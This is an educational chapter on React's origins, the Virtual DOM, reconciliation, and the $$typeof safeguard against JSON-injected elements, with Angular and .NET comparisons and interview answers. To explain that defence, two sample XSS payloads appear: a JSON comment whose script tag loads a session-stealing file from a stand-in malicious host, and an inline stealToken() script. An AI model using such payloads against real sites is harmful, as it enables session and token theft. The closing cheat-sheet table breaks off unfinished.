# Chapter 01: Why React Exists & The Virtual DOM Problem

> **First Principles:** The 5-Layer Pedagogy: The "Film Projector vs. Sledgehammer" (`UI = f(State)`), The "Architect's Paper Scratchpad" (Virtual DOM vs. Real DOM), The "Wax Security Seal" (`$$typeof: Symbol.for('react.element')`), The Cross-Context Bridge Penalty (V8 Heap vs. Blink C++ DOM), Angular Change Detection vs. React Reconciliation, and Enterprise Virtual DOM Performance Engineering.

---

## 1. Why This Topic Exists

To understand React, you must understand the crisis that web engineering faced in 2011–2013.

In early web development (the era of Vanilla JavaScript, jQuery, and Backbone.js), applications manipulated the browser's Document Object Model (DOM) **imperatively**:
- *"Find the button with ID `submit-btn`."*
- *"Add the class `loading`."*
- *"Find the cart count badge."*
- *"Read its text, parse it as an integer, add 1, and write the string back."*
- *"Find the table container, create a `<tr>` node, create four `<td>` nodes, attach text to each, and append it to the `<tbody>`."*

As web applications evolved from static document pages into complex, real-time web applications (such as Facebook’s live notification stream, chat windows, and real-time newsfeeds), this imperative approach suffered a catastrophic failure of scalability known as the **State-DOM Synchronization Nightmare**:
1. **Combinatorial State Explosion:** When state changed across multiple channels (a WebSocket event, a user click, and an HTTP response arriving simultaneously), developers had to manually orchestrate dozens of DOM mutations. If one line of mutation code failed or was skipped in an error handler, the DOM became permanently desynchronized from the application's actual data.
2. **Layout Thrashing & Reflow Storms:** Interleaving DOM writes (`element.style.width = '100px'`) with DOM reads (`element.offsetHeight`) forced the browser's C++ rendering engine into synchronous recalculations, dropping animations from 60 FPS down to single digits.
3. **Fragile Action Chains:** The user interface was an accumulator of historical transitions. If a user double-clicked a button, two asynchronous pipelines raced, leaving orphaned loading spinners and corrupted form inputs.

React was created at Facebook by Jordan Walke to solve this crisis. Its core thesis was radically simple:
**Stop mutating the DOM step-by-step. Treat the UI as a pure, declarative mathematical projection of state:**
```text
UI = f(State)
```
Whenever state changes, you do not touch the screen. You simply describe what the screen should look like for that state, and the engine computes the minimal set of real-world DOM updates automatically via the **Virtual DOM**.

---

## 2. Learning Objectives

By the end of this chapter, you will be able to:
- Articulate the mechanical breakdown of imperative DOM manipulation and explain why the declarative paradigm `UI = f(State)` eliminates state-DOM desynchronization.
- Deconstruct the **Cross-Context Bridge Penalty** between the JavaScript V8 engine and the browser's C++ rendering engine (Blink/WebKit).
- Dissect the internal structure of a **React Virtual DOM Element** (`$$typeof`, `type`, `key`, `ref`, `props`, `children`).
- Explain the mechanical security purpose of **`$$typeof: Symbol.for('react.element')`** and how it prevents Cross-Site Scripting (XSS) attacks from untrusted JSON payloads.
- Differentiate between the **Render Phase** (pure V8 calculation) and the **Commit Phase** (host DOM mutation), debunking the myth that "re-rendering destroys and recreates real HTML elements."
- Contrast React's Virtual DOM diffing against **Angular's Zone.js / Change Detection** and **.NET's retained-mode GUI architectures (WPF, MAUI, Blazor)**.
- Diagnose and prevent Virtual DOM performance traps: unstable keys, object identity churn, and unmemoized heavy subtrees.

---

## 3. Historical Evolution

```text
[1995 - 2005: The Static Document Era]
  - Multi-Page Applications (MPAs).
  - Every user action triggers a full page request; server renders raw HTML strings.
  - Zero state management in the browser.
       │
       ▼
[2006 - 2010: The Imperative DOM Era (jQuery & DHTML)]
  - AJAX introduces dynamic client-side fetching without page reloads.
  - jQuery standardizes cross-browser DOM queries (`$('#btn').fadeIn()`).
  - Core Failure: Developers write imperative action chains; DOM is the sole source of truth.
       │
       ▼
[2010 - 2012: The Early MVC Frameworks (Backbone, Knockout, AngularJS)]
  - Attempted to introduce Model-View-Controller (MVC) to the browser.
  - Two-Way Data Binding (`Model <==> View`).
  - Core Failure: Cascading change loops. Updating Model A triggered View B, which mutated
    Model C, triggering infinite digest cycles and unpredictable UI states.
       │
       ▼
[2013: The React Revolution (JSConf EU 2013)]
  - Jordan Walke introduces React to a skeptical public.
  - Introduced: Declarative Components, One-Way Data Flow, JSX, and the Virtual DOM.
  - Initial reaction: Contempt ("HTML inside JavaScript is a step backward!").
  - Reality: It solved the State-DOM synchronization problem definitively.
       │
       ▼
[2016 - 2017: The Fiber Architecture (React 16)]
  - Completely rewrote React's internal reconciliation engine from synchronous recursion
    (Stack Reconciler) to an incremental, linked-list cooperative scheduler (Fiber).
       │
       ▼
[2020 - 2024: The Modern React Era & The Compilation Shift]
  - Concurrent React (React 18): Time-slicing and non-blocking transitions.
  - React 19 / React Compiler (React Forget): Auto-memoizing component subtrees at build time,
    eliminating the overhead of unneeded Virtual DOM diffing.
```

---

## 4. First Principles & Intuitive Physical Analogies (Layer 1)

### Analogy 1: The Brick House vs. The Film Projector (`UI = f(State)`)
- **The Imperative Approach (jQuery / Manual DOM):**
  Imagine you own a brick house. When a new family member moves in, you hire a construction crew to smash a hole in the living room wall, lay new bricks, repaint the drywall, and rewire the light switch. If the crew forgets to connect the wire or paints the wrong shade, the house is permanently broken.
- **The Declarative Projection (React):**
  Instead of brick and mortar, imagine the UI is a **movie film reel projecting an image onto a movie screen**.
  The movie screen is the browser DOM; the film slide is your **State**.
  When data changes, you do not touch the screen with paint. You simply feed the next frame into the projector:
  ```text
  UI = f(State)
  ```
  Given this exact data right now, this is the complete picture that should appear. React handles the mechanical projection.

---

### Analogy 2: The Architect's Paper Scratchpad (The Virtual DOM)
If redrawing the entire screen from scratch every time a single letter is typed sounds catastrophically slow, that is where the **Virtual DOM** enters:
- **The Real DOM** is the real-world concrete building. It is heavy, rigid, and expensive to alter.
- **The Virtual DOM** is a **pencil sketch on the architect's paper scratchpad**.
- When state changes:
  1. React sketches the entire new house on a fresh sheet of paper in microseconds (**New Virtual DOM**).
  2. It places the new sketch directly beside the previous sketch (**Reconciliation / Diffing**).
  3. It spots the only difference: *"Only the kitchen doorknob changed from brass to silver."*
  4. It sends a technician to the real building to execute **only that one surgical fix** on the real doorknob.

---

### Analogy 3: The Wax Security Seal (`Symbol.for('react.element')`)
Imagine a royal palace where orders are only executed if they arrive with the King's authentic wax seal stamped by the royal mint.
- If a peasant writes an order on a napkin saying *"Give this man 1,000 gold coins"*, the guards reject it because the napkin lacks the authentic seal.
- In React, every legitimate Virtual DOM node created via JSX carries an unforgeable stamp: `$$typeof: Symbol.for('react.element')`.
- A hacker sending malicious JSON payloads over the network **cannot forge a JavaScript Symbol** because JSON does not support Symbols. React rejects any counterfeit element immediately.

---

## 5. Internal Working & Engine Architecture (Layer 2)

### 1. The Cross-Context Bridge Penalty (Why the Real DOM Is "Slow")

JavaScript itself is blazing fast in V8. The performance bottleneck arises because the **JavaScript Engine (V8)** and the **Browser Rendering Engine (Blink / WebKit)** are separate subsystems written in C++ that communicate across an internal binding bridge:

```mermaid
graph LR
    subgraph V8["V8 ENGINE (JavaScript)"]
        V1["const el = document.createElement('div')"]
        V2["el.textContent = 'Hello'"]
        V3["document.body.appendChild(el)"]
    end

    subgraph Bridge["IPC / Binding Bridge"]
        B["Marshaling &amp; Context Switch"]
    end

    subgraph Blink["BLINK ENGINE (C++ DOM)"]
        D1["Allocates C++ Node Class Instance"]
        D2["Attaches 300+ properties"]
        D3["Calculates CSSOM Cascades"]
        D4["Builds Layout Tree (Reflow)"]
        D5["Rasterizes &amp; Paints Pixels"]
    end

    V8 --> Bridge --> Blink
```



#### What Happens When You Touch a Real DOM Node:
1. **Memory Weight:** A single standard `HTMLDivElement` instance carries **over 300 built-in properties** (bounding rects, layout coordinates, event listeners, accessibility trees, and prototype links).
2. **Layout Thrashing:** If JavaScript writes to the DOM (`el.style.height = '200px'`) and immediately reads a geometric property (`el.offsetTop`), the browser cannot wait. It must synchronously interrupt JavaScript execution, compute styles, run layout calculations (Reflow), and update layers.

---

### 2. Anatomy of a Virtual DOM Node (React Element)

A Virtual DOM node is a plain, lightweight JavaScript object literal residing in V8's Young Generation (New Space). It has zero layout data, zero CSSOM attachments, and zero C++ bridge overhead:

```javascript
// A real DOM node in Blink: Heavy C++ object holding 300+ fields
const realDOMNode = document.createElement('button');

// A React Virtual DOM Element: A pure, lightweight JS object
const vNode = {
  $$typeof: Symbol.for('react.element'), // Security fingerprint
  type: 'button',
  key: 'submit-btn',
  ref: null,
  props: {
    className: 'btn-primary',
    disabled: false,
    onClick: function handleClick() { ... },
    children: 'Submit Order'
  },
  _owner: FiberNode { ... }, // Pointer to the component Fiber that created it
  _store: {}
};
```

Creating 10,000 of these plain JavaScript objects in V8 New Space takes **2 to 3 milliseconds**. Comparing two object trees in memory involves simple property lookups that run at near-native CPU speeds.

---

### 3. The 3-Step Reconciliation Pipeline

```text
┌─────────────────────────────────┐
│     1. TRIGGER (State Event)    │  User clicks button -> `setCount(count + 1)`
└────────────────┬────────────────┘
                 │
                 ▼
┌─────────────────────────────────┐
│     2. RENDER (V8 Diffing)      │  - React re-invokes component: `App(props)`
│        [Pure JavaScript]        │  - Returns brand-new Virtual DOM object tree
│                                 │  - Diffing: Compares Old V-DOM vs New V-DOM
│                                 │  - Calculates minimal patch delta
└────────────────┬────────────────┘
                 │
                 ▼
┌─────────────────────────────────┐
│     3. COMMIT (DOM Patching)    │  - React applies ONLY the patch delta to real DOM
│       [Host DOM Mutation]       │  - Surgical: `btn.firstChild.nodeValue = "2"`
│                                 │  - Browser executes a SINGLE batched layout pass
└─────────────────────────────────┘
```

---

### 4. The XSS Injection Attack Vector & The `$$typeof` Security Mechanism

Suppose a server stores user comments in a NoSQL database. An attacker submits a malicious JSON payload designed to trick React into executing arbitrary scripts:

```json
{
  "author": "Attacker",
  "comment": {
    "type": "div",
    "props": {
      "dangerouslySetInnerHTML": {
        "__html": "<script src='https://malicious-site.com/steal-session.js'></script>"
      }
    }
  }
}
```

If a frontend developer renders the comment directly:
```tsx
function CommentView({ userComment }) {
  return <div>{userComment}</div>;
}
```

#### Why Naive Checking Fails:
If React only checked `if (typeof element === 'object' && element.type)`, the attacker's JSON object would be treated as a valid React Element, and the script would execute inside the victim's browser!

#### Why `Symbol` Solves This:
1. Valid JSON **cannot serialize JavaScript Symbols**. If an attacker passes `{ "$$typeof": "react.element" }`, it arrives as a **string**, not a `Symbol`.
2. React's element validator executes:
   ```javascript
   if (element.$$typeof !== Symbol.for('react.element')) {
     throw new Error("Objects are not valid as a React child!");
   }
   ```
3. Because strings never equal Symbols (`"react.element" !== Symbol.for('react.element')`), React detects the forgery, refuses to mount the element, and halts execution before any DOM injection can occur.

---

## 6. Runtime Flow & Execution Traces

### Trace: Updating a Counter from 1 to 2

```text
INITIAL STATE: count = 1
Real DOM: <button class="btn">Count: 1</button>

STEP 1: USER CLICKS BUTTON
- Event handler fires: `setCount(2)`.
- React schedules a render pass on the component's Fiber node.

STEP 2: RENDER PHASE (V8 Heap Computation)
- React calls `CounterComponent({ count: 2 })`.
- Component executes and returns New Virtual DOM Element:
  {
    type: 'button',
    props: { className: 'btn', children: 'Count: 2' }
  }

STEP 3: RECONCILIATION / DIFFING
- React compares Old Element vs. New Element:
  - `Old.type === New.type` ('button' === 'button') -> PRESERVE DOM NODE!
  - `Old.props.className === New.props.className` ('btn' === 'btn') -> NO CLASS CHANGE!
  - `Old.props.children !== New.props.children` ('Count: 1' !== 'Count: 2') -> TEXT CHANGED!
- React generates a Commit Work Item:
  Work: [ UpdateTextNode, Target: buttonTextNode, Value: 'Count: 2' ]

STEP 4: COMMIT PHASE (Host DOM)
- React takes the Commit Work Item and applies it to the browser DOM:
  buttonTextNode.nodeValue = "Count: 2";
- The <button> element is NEVER unmounted, NEVER destroyed, and NEVER recreated.
- Input focus, active selection, and CSS hover states remain 100% stable!
```

---

## 7. Memory Model & Heap Layout

```text
┌────────────────────────────────────────────────────────────────────────────────────────┐
│                                   V8 HEAP (New Space)                                  │
├────────────────────────────────────────────────────────────────────────────────────────┤
│ [ React Element Literal (0x1000) ]                                                     │
│ - $$typeof: Symbol.for('react.element')                                                │
│ - type: 'div'                                                                          │
│ - props: { className: 'card', children: [ 0x1050, 0x1080 ] }                           │
│ (Allocated in New Space; short-lived; collected by Cheney Scavenger after render phase)│
└──────────────────────────────────────────┬─────────────────────────────────────────────┘
                                           │ Referenced by
                                           ▼
┌────────────────────────────────────────────────────────────────────────────────────────┐
│                                   V8 HEAP (Old Space)                                  │
├────────────────────────────────────────────────────────────────────────────────────────┤
│ [ FiberNode Instance (0x5000) ]                                                        │
│ - stateNode: [ C++ Blink HTMLDivElement Pointer (0x9000) ]                             │
│ - memoizedState: 2                                                                     │
│ - child: FiberNode (0x5100)                                                            │
│ - sibling: null                                                                        │
│ (Persistent stateful graph; survives across render passes)                             │
└──────────────────────────────────────────┬─────────────────────────────────────────────┘
                                           │ C++ Internal Binding
                                           ▼
┌────────────────────────────────────────────────────────────────────────────────────────┐
│                              BLINK RENDERING ENGINE (C++ DOM)                          │
├────────────────────────────────────────────────────────────────────────────────────────┤
│ [ Blink WebCore::HTMLDivElement (0x9000) ]                                             │
│ - LayoutBox geometry: { x: 120, y: 340, width: 400, height: 250 }                      │
│ - Computed Styles, Paint Layers, Event Listeners                                       │
└────────────────────────────────────────────────────────────────────────────────────────┘
```

> **Architectural Distinction:**
> - **React Element:** Ephemeral, immutable description of the UI. Allocated in V8 New Space and discarded after reconciliation.
> - **Fiber Node:** Long-lived, mutable internal work unit stored on the V8 heap that maintains component state, hook lists, and references to the actual C++ DOM nodes.

---

## 8. Visual Diagrams

### 1. Imperative Mutation vs. Declarative Projection

```text
IMPERATIVE (jQuery / Vanilla JS):
[ Event ] ──► [ Query DOM ] ──► [ Mutate Node A ] ──► [ Query DOM ] ──► [ Mutate Node B ]
(Fragile: If any step fails or races, the DOM becomes permanently corrupted)

DECLARATIVE (React):
[ Event ] ──► [ Mutate State ] ──► [ UI = f(State) ] ──► [ V-DOM Diff ] ──► [ Real DOM Patch ]
(Deterministic: The UI is mathematically guaranteed to reflect the current state)
```

---

### 2. The Virtual DOM Diffing Boundary

```text
                  VIRTUAL DOM (Memory)                     REAL DOM (Browser Screen)
            
         Old V-DOM Tree       New V-DOM Tree
             [div]                [div]                       [ <div class="app"> ]
            /     \              /     \                                │
         [h1]     [p]   ──►   [h1]     [p]           ──►                │
          │        │           │        │                               │
        "Hi"     "v1"        "Hi"     "v2"                   [ <p> changed to "v2" ]
                                        ▲
                                        │
                            Diff Detected: Only p text!
                            (1 single DOM patch applied!)
```

---

## 9. Real World Usage & Production Patterns

### Pattern 1: State-Driven UI Projection (Eliminating Imperative DOM Spaghetti)

```tsx
// ✅ PRODUCTION PATTERN: Declarative State Machine Projection
import React, { useState } from 'react';

type FetchStatus = 'idle' | 'loading' | 'success' | 'error';

export function OrderSummary({ orderId }: { orderId: string }) {
  const [status, setStatus] = useState<FetchStatus>('idle');
  const [order, setOrder] = useState<any>(null);
  const [error, setError] = useState<string | null>(null);

  async function handleLoadOrder() {
    setStatus('loading');
    setError(null);
    try {
      const response = await fetch(`/api/orders/${orderId}`);
      if (!response.ok) throw new Error('Order not found');
      const data = await response.json();
      setOrder(data);
      setStatus('success');
    } catch (err: any) {
      setError(err.message);
      setStatus('error');
    }
  }

  // Pure projection: Every possible state is deterministically handled
  return (
    <div className="order-card">
      <button disabled={status === 'loading'} onClick={handleLoadOrder}>
        {status === 'loading' ? 'Loading Order...' : 'Fetch Order'}
      </button>

      {status === 'loading' && <div className="skeleton-loader" />}
      {status === 'error' && <div className="alert-box">{error}</div>}
      {status === 'success' && order && (
        <div className="order-details">
          <h3>Order #{order.id}</h3>
          <p>Total: ${order.totalAmount}</p>
        </div>
      )}
    </div>
  );
}
```

---

### Pattern 2: Stable Keys in Dynamic Lists (Preventing DOM Re-creation)

```tsx
// ✅ PRODUCTION PATTERN: Stable Identity Keys
interface Todo {
  id: string; // Globally unique identifier
  text: string;
}

export function TodoList({ items }: { items: Todo[] }) {
  return (
    <ul>
      {items.map((item) => (
        // Providing a stable `key` ensures React preserves the DOM node
        // and its local input state even when items are sorted or filtered!
        <li key={item.id}>
          <input type="checkbox" />
          <span>{item.text}</span>
        </li>
      ))}
    </ul>
  );
}
```

---

## 10. Angular Comparison

| Architectural Dimension | Angular (Enterprise SPA) | React (Component Library / Next.js) |
| :--- | :--- | :--- |
| **Reactivity Paradigm** | **Two-Way Data Binding (`[(ngModel)]`)** historically; Signals in modern Angular (16+). | **One-Way Data Flow:** Data flows down via props; changes flow up via explicit callbacks. |
| **DOM Synchronization** | **Change Detection (Zone.js):** Monkey-patches all browser async APIs; traverses component class instances checking for dirty expressions. | **Virtual DOM Reconciliation:** Component functions re-execute in V8, returning a new V-DOM tree that is diffed against the previous tree. |
| **Internal DOM Architecture**| **Incremental DOM (Ivy Engine):** Compiles templates into bytecode instructions that mutate real DOM in-place without generating virtual intermediate objects. | **Virtual DOM (Fiber Engine):** Constructs intermediate JavaScript object representations of the UI before patching the real DOM. |
| **DOM Access Abstraction** | Encourages `Renderer2` or `ElementRef` abstractions over direct `document.querySelector`. | Uses `useRef()` to hold direct pointers to DOM nodes for imperative escape hatches. |
| **Template Compilation** | Ahead-of-Time (AOT) compiles HTML-like templates into optimized C++-like instruction instructions. | JSX compiles directly into standard `React.createElement` or `_jsx()` JavaScript function calls. |

---

## 11. .NET Comparison

| Architectural Dimension | Microsoft .NET (WPF / MAUI / Blazor) | React (Frontend Web) |
| :--- | :--- | :--- |
| **GUI Architecture** | **Retained-Mode GUI:** The framework maintains a persistent object tree in memory (`VisualTree` / `LogicalTree`). You mutate properties (`Button.IsEnabled = false`). | **Declarative Projection:** Conceptually closer to Immediate-Mode GUI (`UI = f(State)`). You return a fresh tree description on every state change. |
| **State Notification** | **`INotifyPropertyChanged` / XAML Binding:** Properties fire property-changed events; XAML listeners update the specific bound control directly. | **Immutable State Replacement:** `useState` replaces state by reference (`Object.is`), triggering top-down reconciliation. |
| **Web UI Equivalent** | **Blazor (Server / WebAssembly):** Compares a `RenderTree` (Blazor’s equivalent of the Virtual DOM) and emits binary diff packets over WebSockets or in Wasm memory. | **React Virtual DOM:** Compares JavaScript object trees in the V8 heap and applies surgical patches to the browser DOM. |

---

## 12. Enterprise Perspective & Production Risks (Layer 4)

### 1. The Object Identity Churn Trap
Because React components re-execute from top to bottom on every state change, writing inline object literals or anonymous arrow functions can create subtle performance penalties in large component trees:

```tsx
// ❌ PRODUCTION HAZARD: Allocating new object identities on every render
export function ParentComponent({ userId }: { userId: string }) {
  const [count, setCount] = useState(0);

  return (
    <div>
      <button onClick={() => setCount(c => c + 1)}>Increment</button>
      {/* 
        PROBLEM: { theme: 'dark' } generates a brand-new object reference (0x2000)
        on EVERY single button click. Even if MemoizedChild is wrapped in React.memo,
        shallow reference equality (`0x1000 === 0x2000`) fails, forcing the entire 
        child tree to re-diff unnecessarily!
      */}
      <MemoizedChild config={{ theme: 'dark' }} />
    </div>
  );
}
```

#### The Architectural Remedy:
Extract static configurations outside the component scope, or stabilize dynamic objects using `useMemo`:
```tsx
const STATIC_CONFIG = { theme: 'dark' }; // Single stable reference in V8 Old Space

export function ParentComponent() {
  return <MemoizedChild config={STATIC_CONFIG} />;
}
```

---

### 2. The Unstable Key Reconciliation Disaster
Using array indices as keys in dynamic lists causes React's reconciliation algorithm to misidentify DOM elements when items are deleted, reordered, or inserted at the beginning:

```tsx
// ❌ PRODUCTION HAZARD: Index as Key
{items.map((item, index) => (
  <ListItem key={index} data={item} />
))}
```
If item `0` is removed from a list of 100 items:
1. React sees that key `0` through `98` still exist.
2. It mutates the props of every single existing item down the line instead of deleting the first DOM node!
3. If `<ListItem>` contains internal input state (e.g., text typed into a form input), **the user's typed text will physically shift to the wrong item!**

---

## 13. Performance Considerations

### When Does the Virtual DOM Become an Overhead?
In 95% of standard business applications, Virtual DOM diffing takes under **1 to 2 milliseconds** and is imperceptible to users. However, in extreme high-frequency applications, Virtual DOM diffing carries quantifiable costs:
1. **Garbage Collection Pressure:** Generating millions of ephemeral Virtual DOM objects per second inside high-frequency streams (such as 60 FPS HTML5 Canvas games or 10,000 WebSocket market ticks/sec) fills V8's New Space, triggering frequent Scavenger GC pauses.
2. **The "Virtual DOM is Pure Overhead" Argument:** Frameworks like Svelte compile templates into raw DOM surgical commands at build time, eliminating the runtime diffing step entirely.
3. **React's Countermeasure (React Compiler):** React 19's build-time compiler automatically analyzes data flow and memoizes JSX elements, ensuring that unchanged subtrees bypass the Virtual DOM generation phase completely.

---

## 14. Tradeoffs

| Architecture Choice | Advantages | Engineering Tradeoffs |
| :--- | :--- | :--- |
| **Virtual DOM Diffing (React)** | Predictable `UI = f(State)` mental model; decoupled from direct browser DOM; cross-platform rendering (React Native, Ink, SSR). | Memory overhead of virtual object allocation; requires diffing step before DOM mutation. |
| **Direct Imperative DOM (Vanilla / jQuery)** | Zero abstraction overhead; direct C++ DOM mutation. | Unmaintainable at scale; high risk of state-DOM desynchronization; prone to layout thrashing. |
| **Compile-Time Reactivity (Svelte / Solid)** | Zero runtime Virtual DOM allocation; surgical in-place DOM updates. | Higher compiler complexity; syntax shifts away from pure standard JavaScript; smaller ecosystem. |

---

## 15. Common Mistakes & Interview Traps

### Trap 1: "Re-rendering destroys and recreates the real DOM"
**Reality:** Re-rendering is purely a **JavaScript function execution** that returns a Virtual DOM tree. The browser's real DOM is untouched until the Commit Phase, where React applies only the minimal delta.

### Trap 2: Direct DOM Mutation Bypasses
```javascript
// ❌ DISASTER: Mutating the DOM directly in a React component
document.getElementById('title').textContent = 'New Title';
```
**Reality:** Mutating the real DOM directly bypasses React's internal Fiber tree. On the very next state change, React will overwrite your manual change or throw reconciliation errors because its virtual representation does not match reality.

### Trap 3: "Virtual DOM makes React faster than raw JavaScript"
**Reality:** No abstraction is faster than optimal hand-written C++ or Vanilla JavaScript. A hand-crafted, optimal DOM script will always outperform React. React's value proposition is **predictable maintenance and architectural scalability**: it guarantees *sufficiently fast* performance while eliminating entire classes of human synchronization bugs.

---

## 16. Interview Questions & Architectural Answers (Senior, Lead, Architect)

### Question 1 (Senior): The Fundamental Philosophy of `UI = f(State)`
> **Interviewer:** "Explain why React introduced the concept of `UI = f(State)` and how it fundamentally alters the way we handle frontend state compared to imperative libraries like jQuery."

**Architectural Answer:**
"`UI = f(State)` represents a paradigm shift from **imperative action management** to **declarative state projection**.

In the imperative paradigm (jQuery), the developer is responsible for both maintaining state and manually orchestrating the exact sequence of DOM mutations needed to reflect that state. The UI becomes an accumulator of historical transitions. If an asynchronous network response arrives out of order, or an error handler fails to hide a loading indicator, the DOM enters an invalid, desynchronized state that cannot be recovered without a full page reload.

In React, the UI is treated as a pure mathematical projection of data. The developer never writes code that says 'hide this' or 'append that'. Instead, they define explicit states (`idle`, `loading`, `success`, `error`) and declare what the component tree should look like for each state. When state changes, React's reconciliation engine automatically computes the difference between the previous virtual representation and the new one, applying the minimal set of real DOM mutations. This guarantees that the UI can never enter an inconsistent state—if the data is correct, the UI is mathematically guaranteed to be correct."

---

### Question 2 (Lead): The Security Role of `$$typeof: Symbol.for('react.element')`
> **Interviewer:** "Why does every React Element contain a `$$typeof` property with a `Symbol`, and what specific security vulnerability does this prevent?"

**Architectural Answer:**
"The `$$typeof` property is an anti-XSS security mechanism designed to prevent **Cross-Site Scripting (XSS) via JSON injection**.

Suppose an application fetches user-generated content from a backend API that stores untrusted JSON (e.g., from a NoSQL database). If an attacker crafts a malicious JSON payload structured like a React Element containing a `dangerouslySetInnerHTML` prop:
```json
{
  "type": "div",
  "props": { "dangerouslySetInnerHTML": { "__html": "<script>stealToken()</script>" } }
}
```
If React naively accepted any object with `type` and `props` as a valid element, rendering `<div>{userComment}</div>` would result in arbitrary script execution in the client's browser.

To prevent this, React stamps all genuine elements created via JSX or `React.createElement` with `$$typeof: Symbol.for('react.element')`. Because **JSON cannot serialize JavaScript Symbols**, an incoming JSON payload over the network can never contain a real engine `Symbol`. When React validates child elements, it verifies that `element.$$typeof === Symbol.for('react.element')`. Because the attacker's object lacks the authentic Symbol, React immediately rejects it, throwing an error and shutting down the injection vector completely."

---

### Question 3 (Architect): High-Frequency Virtual DOM Bottlenecks
> **Interviewer:** "We are architecting a real-time analytics dashboard with 5,000 live data cells updating 30 times per second over WebSockets. The application suffers from main-thread frame drops and high Interaction to Next Paint (INP) latency due to React re-renders. How would you solve this at an architectural level?"

**Architectural Answer:**
"A Virtual DOM bottleneck at 30 updates per second across 5,000 nodes is caused by **excessive reconciliation churn and garbage collection pressure in V8's New Space**. To achieve a stable 60 FPS, we must decouple high-frequency state updates from top-down Virtual DOM diffing:

1. **Decouple Data Ingestion from the React Tree:**
   - Ingest WebSocket packets in a dedicated Web Worker or an external mutable store outside the React component tree (e.g., Zustand or an atomic store).
   - Throttle updates to the display refresh rate (16.6ms) using `requestAnimationFrame`, aggregating batch updates instead of triggering 30 individual React renders per second.

2. **Isolate Component Re-renders (Fine-Grained Subscriptions):**
   - Ensure the parent dashboard container does not hold the live data in root state. If the root re-renders, React must diff all 5,000 virtual element nodes.
   - Use atomic selectors where each individual cell subscribes directly to its own specific data key, so only the specific cell undergoing change re-executes.

3. **DOM Virtualization (Windowing):**
   - The human display cannot view 5,000 rows simultaneously. Implement DOM virtualization (`react-window` or `@tanstack/react-virtual`) to render only the visible viewport (e.g., 50 rows), reducing the Virtual DOM tree from 5,000 nodes to 50 nodes.

4. **Bypass Virtual DOM for Extreme Hot Paths (Canvas / WebGL):**
   - If the dashboard includes high-density heatmaps or real-time ticker charts, bypass the DOM entirely. Render those specific widgets via an HTML5 Canvas or WebGL context using pre-allocated TypedArrays, eliminating Virtual DOM allocation and C++ DOM bridge traversal completely."

---

## 17. Senior-Level Mental Model & "How to Remember This Forever" (Layer 3)

```text
┌───────────────────────────┬──────────────────────────────────────────────────────────────────┐
│ Mental Anchor             │ Architectural Meaning                                            │
├───────────────────────────┼──────────────────────────────────────────────────────────────────┤
│ 1. The Film Projector     │ UI = f(State). The UI is never manually edited; it is a pure     │
│    (Declarative)          │ mathematical projection of state.                                │
├───────────────────────────┼──────────────────────────────────────────────────────────────────┤
│ 2. The Paper Scratchpad   │ Virtual DOM is a cheap in-memory pencil sketch; the Real DOM is  │
│    (Virtual DOM)          │ concrete bricks. Diff on paper first, then swing the hammer.     │
├───────────────────────────┼──────────────────────────────────────────────────────────────────┤
│ 3. The Royal Wax Seal     │ $$typeof: Symbol.for('react.element') protects against malicious │
│    (XSS Protection)       │ JSON object injection because JSON cannot serialize Symbols.     │
├───────────────────────────┼──────────────────────────────────────────────────────────────────┤
│ 4. Re-render != Repaint   │ Re-rendering is pure JavaScript execution in V8; repainting the  │
│    (Render vs. Commit)    │ real DOM only occurs if the diffing engine finds real changes.   │
└───────────────────────────┴──────────────────────────────────────────────────────────────────┘
```

---

## 18. Core Vocabulary & "Aha!" Breakthrough Insights (Refresher)

- **Declarative Programming:** Describing *what* the program should accomplish without specifying the step-by-step control flow of *how* to do it.
- **Imperative Programming:** Explicitly commanding the computer with step-by-step mutations (`getElementById`, `appendChild`).
- **Virtual DOM:** A lightweight, tree-structured JavaScript object representation of the actual DOM maintained in memory.
- **Reconciliation:** The recursive diffing algorithm React uses to compare two Virtual DOM trees and calculate the minimal set of real DOM updates.
- **Render Phase:** The phase where React invokes component functions and diffs Virtual DOM trees. Pure computation, interruptible, zero side-effects.
- **Commit Phase:** The phase where React writes the calculated patches to the real browser DOM. Synchronous, non-interruptible.
- **Layout Thrashing:** Performance degradation caused by rapidly interleaving DOM writes and DOM reads, forcing the browser into repeated synchronous reflows.
- **Fiber Node:** A long-lived, mutable heap unit of work representing a component instance, holding its state, hooks, and DOM references.
- **The "Aha!" Insight:** *React's speed does not come from the Virtual DOM being faster than the real DOM. React's speed comes from preventing human developers from writing uncoordinated, layout-thrashing DOM mutations while guaranteeing that state and UI never fall out of sync!*

---

## 19. Key Takeaways

1. React was created to eliminate the **State-DOM Synchronization Nightmare** by replacing imperative action chains with the declarative model `UI = f(State)`.
2. The real DOM is slow due to the **C++ to V8 Cross-Context Bridge** and the overhead of layout, reflow, and paint calculations on heavy `HTMLElement` instances.
3. A Virtual DOM Element is a **plain, lightweight JavaScript object literal** that can be created and diffed in V8 memory in microseconds.
4. **`$$typeof: Symbol.for('react.element')`** protects applications from XSS injection attacks because JSON payloads cannot serialize JavaScript Symbol primitives.
5. Re-rendering a component **does not destroy or recreate real DOM nodes**. React reconciles the virtual trees and surgically updates only changed attributes or text nodes.
6. Angular uses **Incremental DOM and Zone.js Change Detection**; React uses **Virtual DOM Diffing and Explicit State Setters**.
7. In high-frequency, real-time enterprise applications, Virtual DOM diffing can be optimized through **DOM virtualization, fine-grained state selectors, and Canvas escape hatches**.

---

## 20. Revision Sheet

```text
┌────────────────────────────────────────────────────────────────────────────────────────────────┐
│                         WHY REACT EXISTS & THE VIRTUAL DOM CHEAT SHEET                         │
├────────────────────────────┬───────────────────────────────────────────────────────────────────┤
│ The Core Formula           │ UI = f(State)                                                     │
├────────────────────────────┼───────────────────────────────────────────────────────────────────┤
│ Real DOM Bottleneck        │ Cross-context C++ bridge calls & synchronous Layout Reflow storms │
├────────────────────────────┼───────────────────────────────────────────────────────────────────┤
│ Virtual DOM Structure      │ Plain JS object: { $$typeof, type, key, ref, props, children }    │
├────────────────────────────┼───────────────────────────────────────────────────────────────────┤
│ Security Primitive         │ $$typeof: Symbol.for('react.element') (Blocks JSON XSS injection) │
├────────────────────────────┼───────────────────────────────────────────────────────────────────┤
│ Render Phase               │ Pure V8 computation; invokes component(); generates & diffs V-DOM│
├────────────────────────────┼───────────────────────────────────────────────────────────────────┤
│ Commit Phase               │ Host DOM mutation; applies minimal surgical patches to real DOM   │
├────────────────────────────┼───────────────────────────────────────────────────────────────────┤
│ Element vs. Fiber          │ Element = Ephemeral UI blueprint; Fiber = Persistent state unit   │
├────────────────────────────┼───────────────────────────────────────────────────────────────────┤
│ Stable Identity Requirement│ Always use stable unique IDs for list keys, never array indices   │
